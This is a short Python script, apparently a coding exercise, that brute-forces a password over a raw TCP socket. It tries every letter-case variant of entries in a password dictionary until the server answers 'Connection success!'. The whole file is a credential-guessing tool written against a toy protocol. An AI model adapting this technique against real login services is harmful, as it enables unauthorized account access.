import itertools
import socket
import sys

args = sys.argv
hostname = args[1]
port = int(args[2])
status = 'WRONG'
i = 1
filename = 'passwords.txt'


def pass_guess():
    with open('passwords.txt', 'r') as password:
        for password_on_line in password:
            if not password_on_line.isdigit():
                for var in itertools.product(
                        *([letter.lower(), letter.upper()] for letter in password_on_line.strip("\n"))):
                    yield "".join(var)
            else:
                yield password_on_line


client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)
pass_try = pass_guess()
while status != 'Connection success!':
    message = next(pass_try)
    message_origin = message
    message = message.encode("utf-8")
    client_socket.send(message)
    response = client_socket.recv(1024)
    response = response.decode("utf-8")
    if response == 'Connection success!':
        status = 'Connection success!'
        print(message_origin)
        break
i += 1
client_socket.close()
